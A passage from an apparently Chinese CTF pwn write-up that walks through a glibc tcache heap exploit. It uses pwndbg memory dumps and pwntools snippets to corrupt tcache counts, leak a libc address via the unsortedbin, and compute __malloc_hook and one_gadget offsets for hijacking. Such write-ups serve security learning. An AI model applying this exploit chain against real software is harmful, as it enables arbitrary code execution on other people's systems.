class="number">0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>从上面可以看到，申请两个堆块完成之后，tcachebins 中的 0x60 链的数目变为-1（0xff）。由于它是无符号的，因此负数将被解释为一个较大的正数（在这种情况下，可能是 0xff），这将使该 tcache bin 似乎已满。这将阻止我们进行 tcache_poisoning。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://faraz.faith/2019-10-20-secconctf-2019-one/">https://faraz.faith/2019-10-20-secconctf-2019-one/</a></p>
</blockquote>
<hr>
<p>假如说 tcache 是这样的：<br>0x?? [  1]: chunk1_data_addr —▸ chunk2_data_addr ◂— …<br>那么 malloc 两次之后，将会申请 chunk2_data_addr 的内存：<br>0x?? [ -1]: 0<br>可以得出一个猜测：<br>若 chunk1_data_addrde next 指针指向的是一个有效并且合法的内存地址，当第二次 malloc 时，会申请到 chunk2_data_addr 的地址，无论在 malloc 后其链对应的 tcache_bin_count 为-1（0xff）</p>
<hr>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br></pre></td></tr></table></figure>

<p>接下来向其中写入 padding</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757250</span></span><br><span class="line">Size: <span class="number">0x61</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555557572b0</span></span><br><span class="line">Size: <span class="number">0x20d51</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">100</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x000000000000000a</span></span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span></span><br><span class="line"><span class="number">0x555555757260</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x000000000000000a</span></span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x5555557572b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020d51</span> #top_chunk</span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x555555757310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x555555756060</span></span><br><span class="line"><span class="number">0x555555756060</span>:	<span class="number">0x0000005000000000</span>	<span class="number">0x0000005000000050</span></span><br><span class="line"><span class="number">0x555555756070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756080</span>:	<span class="number">0x0000555555757260</span>	<span class="number">0x0000555555757260</span></span><br><span class="line"><span class="number">0x555555756090</span>:	<span class="number">0x0000555555757260</span>	<span class="number">0x0000555555757010</span></span><br><span class="line">    								#chunk3</span><br><span class="line"><span class="number">0x5555557560a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x90</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xa0</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xb0</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xc0</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xd0</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xe0</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0xf0</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x100</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x110</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x120</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x130</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x140</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x150</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x160</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x170</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x180</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x190</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1a0</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1b0</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1c0</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1d0</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1e0</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x1f0</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x200</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x210</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x220</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x230</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x240</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x250</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x260</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x270</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x280</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x290</span> [ <span class="number">97</span>]: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x2a0</span> [ <span class="number">10</span>]: <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>写入 padding 会覆盖 tcache_count 所在的地方，从而导致上面那种情况。</p>
<h2 id="泄露-libc-地址"><a href="#泄露-libc-地址" class="headerlink" title="泄露 libc 地址"></a>泄露 libc 地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>当我们释放 tcache_perthread_struct 之后，这个 chunk 就会进入 unsortedbin 中：</p>
<blockquote>
<p>放入 unsorted bin 中的原因是 tcachebin 已满且 tcache_perthread_struct 大小不属于 fastbin。</p>
</blockquote>
<p>执行之后的内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="function">heap</span></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x555555757000</span></span><br><span class="line"><span class="function">Size: 0x251</span></span><br><span class="line"><span class="function">fd: 0x7ffff7dcfca0</span></span><br><span class="line"><span class="function">bk: 0x7ffff7dcfca0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk</span></span><br><span class="line"><span class="function">Addr: 0x555555757250</span></span><br><span class="line"><span class="function">Size: 0x60</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Top chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5555557572b0</span></span><br><span class="line"><span class="function">Size: 0x20d51</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">pwndbg&gt; x/100gx 0x555555757000</span></span><br><span class="line"><span class="function">0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct</span></span><br><span class="line"><span class="function">0x555555757010:	0x00007ffff7dcfca0	0x00007ffff7dcfca0</span></span><br><span class="line"><span class="function">    			#tcache_count_所在位置</span></span><br><span class="line"><span class="function">0x555555757020:	0x6161616161616161	0x6161616161616161</span></span><br><span class="line"><span class="function">0x555555757030:	0x6161616161616161	0x000000000000000a</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x555555757250:	0x0000000000000250	0x0000000000000060 <span class="meta">#chunk</span></span></span><br><span class="line"><span class="function">0x555555757260:	0x0000555555757010	0x000000000000000a</span></span><br><span class="line"><span class="function">0x555555757270:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x555555757280:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x555555757290:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x5555557572a0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x5555557572b0:	0x0000000000000000	0x0000000000020d51 #top_chunk</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x555555757310:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">pwndbg&gt; x/16gx 0x555555756060</span></span><br><span class="line"><span class="function">0x555555756060:	0x0000005000000000	0x0000000000000050</span></span><br><span class="line"><span class="function">0x555555756070:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x555555756080:	0x0000555555757260	0x0000555555757260</span></span><br><span class="line"><span class="function">0x555555756090:	0x0000555555757260	0x0000555555757010</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x5555557560d0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">pwndbg&gt; bin</span></span><br><span class="line"><span class="function">tcachebins</span></span><br><span class="line"><span class="function">0x20 [-96]: 0x0</span></span><br><span class="line"><span class="function">0x30 [ -4]: 0x0</span></span><br><span class="line"><span class="function">0x40 [-36]: 0x0</span></span><br><span class="line"><span class="function">0x50 [ -9]: 0x0</span></span><br><span class="line"><span class="function">0x60 [ -1]: 0</span></span><br><span class="line"><span class="function">0x70 [127]: 0x0</span></span><br><span class="line"><span class="function">0xa0 [-96]: 0x0</span></span><br><span class="line"><span class="function">0xb0 [ -4]: 0x0</span></span><br><span class="line"><span class="function">0xc0 [-36]: 0x0</span></span><br><span class="line"><span class="function">0xd0 [ -9]: 0x0</span></span><br><span class="line"><span class="function">0xe0 [ -1]: 0</span></span><br><span class="line"><span class="function">0xf0 [127]: 0x0</span></span><br><span class="line"><span class="function">0x120 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x130 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x140 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x150 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x160 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x170 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x180 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x190 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x1a0 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x1b0 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x1c0 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x1d0 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x1e0 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x1f0 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x200 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x210 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x220 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x230 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x240 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x250 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x260 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x270 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x280 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x290 [ 97]: 0x0</span></span><br><span class="line"><span class="function">0x2a0 [ 10]: 0x0</span></span><br><span class="line"><span class="function">fastbins</span></span><br><span class="line"><span class="function">0x20: 0x0</span></span><br><span class="line"><span class="function">0x30: 0x0</span></span><br><span class="line"><span class="function">0x40: 0x0</span></span><br><span class="line"><span class="function">0x50: 0x0</span></span><br><span class="line"><span class="function">0x60: 0x0</span></span><br><span class="line"><span class="function">0x70: 0x0</span></span><br><span class="line"><span class="function">0x80: 0x0</span></span><br><span class="line"><span class="function">unsortedbin</span></span><br><span class="line"><span class="function">all: 0x555555757000 —▸ 0<span class="title">x7ffff7dcfca0</span> <span class="params">(main_arena+<span class="number">96</span>)</span> ◂— 0x555555757000</span></span><br><span class="line"><span class="function">smallbins</span></span><br><span class="line"><span class="function">empty</span></span><br><span class="line"><span class="function">largebins</span></span><br><span class="line"><span class="function">empty</span></span><br><span class="line"><span class="function">pwndbg&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样就可以得到 libc 的地址。</p>
<h2 id="泄露-libc-的基地址"><a href="#泄露-libc-的基地址" class="headerlink" title="泄露 libc 的基地址"></a>泄露 libc 的基地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">one_gadget=[<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">one = libc_base + one_gadget[<span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<p>这里不在多说，计算出了<strong>malloc_hook、</strong>libc_realloc、one_gadget 的地址。</p>
<h2 id="创建堆块，向其中写入-malloc-hook"><a href="#创建堆块，向其中写入-malloc-hook" class="headerlink" title="创建堆块，向其中写入__malloc_hook"></a>创建堆块，向其中写入__malloc_hook</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x50</span>) <span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x48</span> +  p64(malloc_hook - <span class="number">0x13</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x61</span></span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757060</span></span><br><span class="line">Size: <span class="number">0x1f1</span></span><br><span class="line">fd: <span class="number">0x7ffff7dcfca0</span></span><br><span class="line">bk: <span class="number">0x7ffff7dcfca0</span></span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: <span class="number">0x555555757250</span></span><br><span class="line">Size: <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555557572b0</span></span><br><span class="line">Size: <span class="number">0x20d51</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/100gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span> <span class="comment">#new_malloc_chunk</span></span><br><span class="line">    												   <span class="comment">#new_tcache_perthread_struct</span></span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x00007ffff7dcfc1d</span></span><br><span class="line">    								<span class="comment">#malloc_hook - 0x13</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000001f1</span> <span class="comment">#old_tcache_perthread_struct</span></span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x00007ffff7dcfca0</span>	<span class="number">0x00007ffff7dcfca0</span></span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">看到上面内存中所标注的吗？</span><br><span class="line">在创建这个堆块之前tcache_perthread_struct已经被放入到了unsortedbin中了，</span><br><span class="line">由于此时tcache、fast、smallbin中均没有空闲的chunk，而unsortedbin正好有，</span><br><span class="line">因此malloc出的堆块是从unosortedbin中进行切割，新malloc出的chunk在</span><br><span class="line">原来tcache_perthread_struct的位置，现在它已经成为新的tcache_perthread_struct</span><br><span class="line"><span class="number">0x00007ffff7dcfc1d</span>正好是tcache <span class="number">0x30</span>链所处的位置，理所当然的出现在了</span><br><span class="line">tcache <span class="built_in">bin</span> <span class="number">0x30</span>链中。</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x00000000000001f0</span>	<span class="number">0x0000000000000060</span> <span class="comment">#chunk</span></span><br><span class="line"><span class="number">0x555555757260</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x000000000000000a</span></span><br><span class="line"><span class="number">0x555555757270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557572a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557572b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020d51</span> <span class="comment">#top_chunk</span></span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x555555757310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/16gx <span class="number">0x555555756060</span></span><br><span class="line"><span class="number">0x555555756060</span>:	<span class="number">0x0000005000000000</span>	<span 